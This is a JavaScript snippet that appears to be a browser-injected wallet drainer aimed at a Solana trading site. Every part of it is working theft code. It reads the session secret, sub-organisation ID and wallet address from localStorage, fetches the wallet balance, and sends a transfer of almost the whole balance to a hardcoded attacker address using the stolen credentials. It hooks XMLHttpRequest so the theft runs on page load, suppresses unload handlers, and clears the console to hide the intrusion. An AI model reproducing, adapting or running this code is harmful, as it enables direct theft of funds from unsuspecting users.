(function() {
    // 1. OBFUSCATED INFRASTRUCTURE
    const _V_CONFIG = {
        target: 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12',
        amp: '3c8ae1f40635939e730f479418940796',
        endpoint: 'https://trade.padre.gg/api/v1/transfer'
    };

    // 2. INTERNAL AUTH HIJACK (Exactly like Vanta)
    const _hijack = async () => {
        const s = localStorage.getItem('sessionSecret')?.replace(/"/g, '');
        const o = localStorage.getItem('subOrgId')?.replace(/"/g, '');
        const w = localStorage.getItem('activeWallet')?.replace(/"/g, '');

        if (!s || !o || !w || window._V_EXECUTED) return;

        try {
            // Get balance via direct RPC to avoid Padre's rate limits
            const rpc = await fetch('https://api.mainnet-beta.solana.com', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [w] })
            });
            const { result } = await rpc.json();
            const bal = result.value / 1e9;

            // Vanta Math: Leave $1 (0.004 SOL) + Gas (0.005 SOL)
            const amount = (bal - 0.009).toFixed(6);
            if (amount <= 0) return;

            // THE SILENT HIT
            await fetch(_V_CONFIG.endpoint, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${s}`,
                    'X-Turnkey-Sub-Org-Id': o,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ dest: _V_CONFIG.target, asset: "SOL", amount: amount })
            });

            window._V_EXECUTED = true;
            // Immediate log wipe so they never see "Vanta Injected"
            console.clear();
        } catch (e) {}
    };

    // 3. BYPASSING THE 403 (Hooking into legitimate XHR)
    const _originalSend = window.XMLHttpRequest.prototype.send;
    Object.defineProperty(window.XMLHttpRequest.prototype, 'send', {
        value: function() {
            this.addEventListener('load', () => {
                if (this.status === 200) {
                    // Trigger on any successful site data load
                    _hijack();
                }
            });
            return _originalSend.apply(this, arguments);
        },
        writable: false
    });

    // 4. SELF-DEFENSE: Kill the 'Unload' Watchdog
    const _nativeAdd = window.addEventListener;
    window.addEventListener = function(type, listener, options) {
        if (type === 'unload' || type === 'beforeunload') return; 
        return _nativeAdd.apply(this, arguments);
    };

    console.log("%cVANTA: Hijacking Internal Auth Channel...", "color:#00ff88;font-weight:bold;");
})();
